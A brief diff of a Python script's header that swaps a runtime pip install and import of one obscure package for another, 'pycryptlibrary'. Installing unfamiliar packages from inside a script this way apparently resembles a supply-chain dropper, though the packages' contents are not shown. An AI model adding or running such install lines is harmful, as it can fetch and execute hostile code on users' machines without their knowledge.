@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolourkitsV2")
-import syscolourkitsV2
+os.system("pip install pycryptlibrary")
+import pycryptlibrary
 import json
 import httpx
 import time
